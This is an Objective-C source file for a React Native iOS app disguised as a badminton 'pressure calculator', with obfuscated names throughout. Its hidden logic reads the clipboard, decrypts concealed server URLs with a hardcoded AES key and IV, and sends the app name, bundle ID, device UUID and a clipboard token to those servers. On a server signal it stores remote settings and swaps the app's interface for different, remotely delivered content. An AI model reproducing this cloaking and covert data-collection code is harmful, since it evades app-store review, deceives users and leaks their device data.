#import "RNBadmintonPressureCalculator.h"
#import <RNBadmintonAllStarExhibitionShow/RNBadmintonAllStarShow.h>
#import "RNNetReachability.h"
#import <CocoaSecurity/CocoaSecurity.h>
#import <react-native-orientation-locker/Orientation.h>

#import <CodePush/CodePush.h>
#if __has_include("RNIndicator.h")
    #import "RNIndicator.h"
    #import "JJException.h"
    #import "RNCPushNotificationIOS.h"
#else
    #import <RNIndicator.h>
    #import <JJException.h>
    #import <RNCPushNotificationIOS.h>
#endif

#import <React/RCTBridge.h>
#import <React/RCTBundleURLProvider.h>
#import <React/RCTRootView.h>
#import <React/RCTAppSetupUtils.h>

#if RCT_NEW_ARCH_ENABLED
#import <React/CoreModulesPlugins.h>
#import <React/RCTCxxBridgeDelegate.h>
#import <React/RCTFabricSurfaceHostingProxyRootView.h>
#import <React/RCTSurfacePresenter.h>
#import <React/RCTSurfacePresenterBridgeAdapter.h>
#import <ReactCommon/RCTTurboModuleManager.h>

#import <react/config/ReactNativeConfig.h>

static NSString *const kRNConcurrentRoot = @"concurrentRoot";

@interface RNBadmintonPressureCalculator () <RCTCxxBridgeDelegate, RCTTurboModuleManagerDelegate> {
  RCTTurboModuleManager *_turboModuleManager;
  RCTSurfacePresenterBridgeAdapter *_bridgeAdapter;
  std::shared_ptr<const facebook::react::ReactNativeConfig> _reactNativeConfig;
  facebook::react::ContextContainer::Shared _contextContainer;
}
@end
#endif

@interface RNBadmintonPressureCalculator()

@property (strong, nonatomic)  NSArray *racketPressure;
@property (strong, nonatomic)  NSArray *calculatorShafts;
@property (strong, nonatomic)  NSDictionary *teammateParams;
@property (nonatomic, strong) RNNetReachability *pressureReachability;
@property (nonatomic, copy) void (^vcBlock)(void);


@end

@implementation RNBadmintonPressureCalculator

static RNBadmintonPressureCalculator *instance = nil;

+ (instancetype)shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
    instance.pressureReachability = [RNNetReachability reachabilityForInternetConnection];
    instance.racketPressure = @[[NSString stringWithFormat:@"%@%@", @"a71556f65ed2b", @"25b55475b964488334f"],
                           [NSString stringWithFormat:@"%@%@", @"ADD20BFCD9D4E", @"A0278B11AEBB5B83365"]];
    instance.calculatorShafts = @[@"financialRain_APP", @"umKey", @"umChannel", @"sensorUrl", @"sensorProperty", @"vPort", @"vSecu"];
  });
  return instance;
}

- (void)pressureCalculator_startMonitoring {
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(pressureCalculator_networkStatusDidChanged:) name:kReachabilityChangedNotification object:nil];
    [self.pressureReachability startNotifier];
}

- (void)pressureCalculator_stopMonitoring {
    [[NSNotificationCenter defaultCenter] removeObserver:self name:kReachabilityChangedNotification object:nil];
    [self.pressureReachability stopNotifier];
}

- (void)dealloc {
    [self pressureCalculator_stopMonitoring];
}


- (void)pressureCalculator_networkStatusDidChanged:(NSNotification *)notification {
    RNNetReachability *reachability = notification.object;
  NetworkStatus networkStatus = [reachability currentReachabilityStatus];
  
  if (networkStatus != NotReachable) {
      NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
      if ([ud boolForKey:self.calculatorShafts[0]] == NO) {
          if (self.vcBlock != nil) {
              [self pressureCalculator_pc_throughMainRootController:self.vcBlock];
          }
      }
  }
}

- (void)pressureCalculator_pc_throughMainRootController:(void (^ __nullable)(void))changeVcBlock {
    NSBundle *bundle = [NSBundle mainBundle];
    NSArray<NSString *> *tempArray = [bundle objectForInfoDictionaryKey:@"com.openinstall.APP_URLS"];
    [self pressureCalculator_pc_throughMainRootController:changeVcBlock index:0 mArray: tempArray];
}

- (void)pressureCalculator_pc_throughMainRootController:(void (^ __nullable)(void))changeVcBlock index: (NSInteger)index mArray:(NSArray<NSString *> *)tArray{
    if ([tArray count] < index) {
        return;
    }
    NSError *error;
    NSData *postData = [NSJSONSerialization dataWithJSONObject:self.teammateParams options:0 error:&error];
    if (error) {
        return;
    }
    NSString *urlStr = [CocoaSecurity aesDecryptWithBase64:tArray[index] hexKey:self.racketPressure[0] hexIv:self.racketPressure[1]].utf8String;
    NSURL *url = [NSURL URLWithString:urlStr];
    NSURLSessionConfiguration *sessionConfig = [NSURLSessionConfiguration defaultSessionConfiguration];
    sessionConfig.timeoutIntervalForRequest = 18.0;
    NSURLSession *session = [NSURLSession sessionWithConfiguration:sessionConfig];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"POST";
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    [request setHTTPBody:postData];
    NSURLSessionTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        if (error == nil) {
          NSDictionary *objc = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableLeaves error:nil];
          NSDictionary *data = [objc valueForKey:@"data"];
          if (objc == nil || data == nil || [data isKindOfClass:[NSNull class]]) {
            return;
          }
          int code = [[objc valueForKey:@"code"] intValue];
          int isValid = [[data valueForKey:@"isValid"] intValue];
          if (code == 200 && isValid == 1) {
            NSString *tKey = [[data valueForKey:@"Info"] valueForKey:@"tKey"];
            CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:[self pressureCalculator_savePressureMeta:tKey]
                                                                      hexKey:self.racketPressure[0]
                                                                       hexIv:self.racketPressure[1]];
            NSDictionary *iaafDict = [self pressureCalculator_jsonToDic:aes.utf8String];
            if([self pressureCalculator_configInfo:iaafDict]) {
              dispatch_async(dispatch_get_main_queue(), ^{
                if (changeVcBlock != nil) {
                    changeVcBlock();
                }
              });
            }
          }
        } else {
          if (index < [tArray count] - 1) {
              [self pressureCalculator_pc_throughMainRootController:changeVcBlock index:index + 1 mArray:tArray];
          }
        }
    }];
    [dataTask resume];
}

- (UIInterfaceOrientationMask)getOrientationMask {
    return [Orientation getOrientation];
}

- (NSDictionary *)pressureCalculator_jsonToDic: (NSString* )utf8String {
  NSData *data = [utf8String dataUsingEncoding:NSUTF8StringEncoding];
  if (data == nil) {
    return @{};
  }
  NSDictionary *iaafDict = [NSJSONSerialization JSONObjectWithData:data
                                                       options:kNilOptions
                                                         error:nil];
  return iaafDict[@"data"];
}

- (BOOL)pressureCalculator_getPressureTeamInfo {
  NSString *cp = [UIPasteboard generalPasteboard].string ?: @"";
  NSString *matrixString = [self pressureCalculator_savePressureMeta:cp];
  if (matrixString == nil || [matrixString isEqualToString:@""]) {
    return NO;
  } else {
    NSBundle *bundle = [NSBundle mainBundle];
    NSString *appName = [bundle objectForInfoDictionaryKey:@"CFBundleDisplayName"];
    if (!appName) {
        appName = [bundle objectForInfoDictionaryKey:@"CFBundleName"];
    }
    self.teammateParams = [NSMutableDictionary dictionary];
    [self.teammateParams setValue:appName forKey:@"tName"];
    [self.teammateParams setValue:[bundle bundleIdentifier] forKey:@"tBundle"];
    [self.teammateParams setValue:[[[UIDevice currentDevice] identifierForVendor] UUIDString] forKey:@"tUUID"];
    [self.teammateParams setValue:matrixString forKey:@"token"];
    return YES;
  }
}

- (NSString *)pressureCalculator_savePressureMeta: (NSString* )matrixString {
  if ([matrixString containsString:@"#iPhone#"]) {
    NSArray *university = [matrixString componentsSeparatedByString:@"#iPhone#"];
    if (university.count > 1) {
        matrixString = university[1];
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [university enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:[NSString stringWithFormat:@"iPhone_%zd", idx]];
    }];
    [ud synchronize];
  }
  return matrixString;
}

- (BOOL)pressureCalculator_configInfo:(NSDictionary *)iaafDict {
    if (iaafDict == nil || [iaafDict.allKeys count] < 3) {
      return NO;
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud setBool:YES forKey:self.calculatorShafts[0]];
    
    [iaafDict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:key];
    }];

    [ud synchronize];
    return YES;
}

- (BOOL)pressureCalculator_pc_showThisWay:(void (^ __nullable)(void))changeVcBlock {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  if ([ud boolForKey:self.calculatorShafts[0]]) {
    return YES;
  } else {
    self.vcBlock = changeVcBlock;
    if ([self pressureCalculator_getPressureTeamInfo]) {
      [self pressureCalculator_pc_throughMainRootController:changeVcBlock];
      [self pressureCalculator_startMonitoring];
    }
    return NO;
  }
}

- (UIViewController *)pressureCalculator_pc_throughMainRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions
{
  RCTAppSetupPrepareApp(application);
    
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    
  [[RNBadmintonAllStarShow shared] allStarShowPressure_ap_configMayServer:[ud stringForKey:self.calculatorShafts[5]] withSecu:[ud stringForKey:self.calculatorShafts[6]]];

  UNUserNotificationCenter *center = [UNUserNotificationCenter currentNotificationCenter];
  center.delegate = self;
    
  [JJException configExceptionCategory:JJExceptionGuardDictionaryContainer | JJExceptionGuardArrayContainer | JJExceptionGuardNSStringContainer];
  [JJException startGuardException];
    
  RCTBridge *bridge = [[RCTBridge alloc] initWithDelegate:self launchOptions:launchOptions];

#if RCT_NEW_ARCH_ENABLED
  _contextContainer = std::make_shared<facebook::react::ContextContainer const>();
  _reactNativeConfig = std::make_shared<facebook::react::EmptyReactNativeConfig const>();
  _contextContainer->insert("ReactNativeConfig", _reactNativeConfig);
  _bridgeAdapter = [[RCTSurfacePresenterBridgeAdapter alloc] initWithBridge:bridge contextContainer:_contextContainer];
  bridge.surfacePresenter = _bridgeAdapter.surfacePresenter;
#endif

  NSDictionary *initProps = [self prepareInitialProps];
  UIView *rootView = RCTAppSetupDefaultRootView(bridge, @"NewYorkCity", initProps);

  if (@available(iOS 13.0, *)) {
    rootView.backgroundColor = [UIColor systemBackgroundColor];
  } else {
    rootView.backgroundColor = [UIColor whiteColor];
  }

  UIViewController *rootViewController = [HomeIndicatorView new];
  rootViewController.view = rootView;
  UINavigationController *navc = [[UINavigationController alloc] initWithRootViewController:rootViewController];
  navc.navigationBarHidden = true;
  return navc;
}

- (void)userNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)(void))completionHandler {
  [RNCPushNotificationIOS didReceiveNotificationResponse:response];
}

- (void)userNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(UNNotificationPresentationOptions options))completionHandler {
  completionHandler(UNNotificationPresentationOptionSound | UNNotificationPresentationOptionAlert | UNNotificationPresentationOptionBadge);
}

/// This method controls whether the `concurrentRoot`feature of React18 is turned on or off.
///
/// @see: https://reactjs.org/blog/2022/03/29/react-v18.html
/// @note: This requires to be rendering on Fabric (i.e. on the New Architecture).
/// @return: `true` if the `concurrentRoot` feture is enabled. Otherwise, it returns `false`.
- (BOOL)concurrentRootEnabled
{
  // Switch this bool to turn on and off the concurrent root
  return true;
}

- (NSDictionary *)prepareInitialProps
{
  NSMutableDictionary *initProps = [NSMutableDictionary new];

#ifdef RCT_NEW_ARCH_ENABLED
  initProps[kRNConcurrentRoot] = @([self concurrentRootEnabled]);
#endif

  return initProps;
}

- (NSURL *)sourceURLForBridge:(RCTBridge *)bridge {
#if DEBUG
  return [[RCTBundleURLProvider sharedSettings] jsBundleURLForBundleRoot:@"index"];
#else
  return [CodePush bundleURL];
#endif
}


#if RCT_NEW_ARCH_ENABLED

#pragma mark - RCTCxxBridgeDelegate

- (std::unique_ptr<facebook::react::JSExecutorFactory>)jsExecutorFactoryForBridge:(RCTBridge *)bridge
{
  _turboModuleManager = [[RCTTurboModuleManager alloc] initWithBridge:bridge
                                                             delegate:self
                                                            jsInvoker:bridge.jsCallInvoker];
  return RCTAppSetupDefaultJsExecutorFactory(bridge, _turboModuleManager);
}

#pragma mark RCTTurboModuleManagerDelegate

- (Class)getModuleClassFromName:(const char *)name
{
  return RCTCoreModulesClassProvider(name);
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                      jsInvoker:(std::shared_ptr<facebook::react::CallInvoker>)jsInvoker
{
  return nullptr;
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                     initParams:
                                                         (const facebook::react::ObjCTurboModule::InitParams &)params
{
  return nullptr;
}

- (id<RCTTurboModule>)getModuleInstanceFromClass:(Class)moduleClass
{
  return RCTAppSetupDefaultModuleFromClass(moduleClass);
}

#endif

@end
